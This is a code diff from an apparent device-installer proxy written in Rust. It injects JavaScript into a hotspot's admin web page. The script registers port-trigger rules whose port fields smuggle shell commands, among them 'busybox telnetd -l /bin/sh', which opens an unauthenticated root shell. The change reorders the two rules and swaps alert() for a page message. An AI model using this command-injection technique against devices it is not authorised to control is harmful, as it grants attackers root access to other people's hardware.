@@ -272,9 +272,19 @@ async fn handler(state: State<AppState>, mut req: Request) -> Result<Response, S
         let mut data = BytesMut::from(data);
         // inject some javascript into the admin UI to get us a telnet shell.
         data.extend(br#";window.rayhunterPoll = window.setInterval(() => {
-            Globals.models.PTModel.add({applicationName: "rayhunter-root", enableState: 1, entryId: 1, openPort: "2300-2400", openProtocol: "TCP", triggerPort: "$(busybox telnetd -l /bin/sh)", triggerProtocol: "TCP"});
+            // Intentionally register rayhunter-daemon before rayhunter-root so that we are less
+            // likely to run into race conditions where rayhunter-root is launched, and the
+            // installer kills the server. In practice both HTTP requests may execute concurrently
+            // anyway.
             Globals.models.PTModel.add({applicationName: "rayhunter-daemon", enableState: 1, entryId: 2, openPort: "2400-2500", openProtocol: "TCP", triggerPort: "$(/etc/init.d/rayhunter_daemon start)", triggerProtocol: "TCP"});
-            alert("Success! You can go back to the rayhunter installer.");
+            Globals.models.PTModel.add({applicationName: "rayhunter-root", enableState: 1, entryId: 1, openPort: "2300-2400", openProtocol: "TCP", triggerPort: "$(busybox telnetd -l /bin/sh)", triggerProtocol: "TCP"});
+
+            // Do not use alert(), instead replace page with success message. Using alert() will
+            // block the event loop in such a way that any background promises are blocked from
+            // progress too. For example: The HTTP requests to register our port triggers!
+            document.body.innerHTML = "<h1>Success! You can go back to the rayhunter installer.</h1>";
+
+            // We can stop polling now, presumably both requests are already inflight.
             window.clearInterval(window.rayhunterPoll);
         }, 1000);"#);
         response = Response::from_parts(parts, Body::from(Bytes::from(data)));
